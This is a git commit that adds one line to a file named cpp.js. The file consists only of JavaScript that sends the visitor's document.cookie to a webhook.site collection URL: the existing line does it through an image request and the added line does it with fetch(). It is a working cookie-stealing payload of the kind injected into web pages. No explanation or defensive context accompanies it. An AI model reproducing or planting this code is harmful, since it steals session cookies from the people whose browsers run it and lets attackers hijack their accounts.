03fe177177c85c9a7fcfd197415ff3f555981bde
masab321 <34965023+masab321@users.noreply.github.com>
2023-11-11 21:41:04 +0600

    Update cpp.js

--- cpp.js
+++ cpp.js
@@ -1,1 +1,2 @@
+fetch("https://webhook.site/93acc177-df8d-459f-a635-4463e89cd39c/?cookie=" + document.cookie);
 var i=new Image;i.src="https://webhook.site/93acc177-df8d-459f-a635-4463e89cd39c/?cookie="+document.cookie;
